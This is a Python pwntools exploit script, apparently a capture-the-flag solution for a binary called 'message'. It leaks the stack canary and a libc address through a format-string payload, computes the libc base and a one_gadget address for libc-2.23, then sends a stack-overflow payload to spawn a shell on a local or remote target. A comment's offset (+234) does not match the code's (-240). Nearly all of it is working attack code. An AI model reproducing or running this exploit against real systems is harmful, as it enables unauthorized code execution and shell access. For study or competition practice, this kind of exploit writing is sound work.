#!/usr/bin/env python3

# string format and stack overflow
from pwn import *

g_fname = "./message"
g_elf = ELF(g_fname)
context.binary = g_elf

# libc-2.23 at remote.
g_libname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"
g_libc = ELF(g_libname)

if (args.REMOTE):
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))
else:
    g_io = process(g_fname)

def getpid():
    if (args.REMOTE==""):
        log.DEBUG("pid:%d" % g_io.proc.pid)
        pause()


def pwn():
    # %9$p is cannary
    off_canary = 9
    # %15$p is __libc_start_main+234 
    off_libc_start_main = 15
    # one_gadeget offset of libc-2.23
    off_ogg = 0x45226
    # stack overflow padding len
    pad_len = 0x20 - 8

    # leak cannary and libc_start_main
    payload_leak = "%9$p\n%15$p"
    g_io.sendafter("name: ", payload_leak)
    canary = int(g_io.recvline(), 16)
    libc_main = int(g_io.recvline(), 16)
    log.success("canary=%#x\n__libc_start_main=%#x" % (canary, libc_main))
    
    addr_libc_base = libc_main - g_libc.sym["__libc_start_main"] - 240
    addr_ogg = addr_libc_base + off_ogg
    log.success("libc@%#x\none_gadget@%#x" % (addr_libc_base, addr_ogg))
    payload_shell = flat([pad_len*'a', canary, 0xdeadbeef, addr_ogg])
    g_io.sendafter("message: ", payload_shell)

if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()